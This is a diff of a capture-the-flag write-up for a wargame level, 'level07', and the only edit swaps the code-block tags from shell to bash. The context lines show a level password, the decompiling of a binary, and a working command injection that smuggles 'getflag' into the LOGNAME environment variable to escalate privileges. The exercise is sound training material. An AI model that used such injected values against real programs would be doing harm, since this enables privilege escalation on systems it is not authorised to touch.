@@ -6,7 +6,7 @@ level07's password: `wiok45aaoguiboiki2tuin6ub`
 
 1. examinate existing files and permissions
 
-```shell
+```bash
 ls -la
 ```
 
@@ -14,7 +14,7 @@ shows that the level07 executable belongs to flag07 group, privilege escalation 
 
 2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code
 
-```shell
+```bash
 scp -P 4242 level07@<host>:level07 .
 retdecomp level07
 ```
@@ -23,7 +23,7 @@ shows `asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));` which permits arb
 
 4. tweak the environment variables and pwn the flag
 
-```shell
+```bash
 LOGNAME='exploit;getflag'
 ./level07
 ```
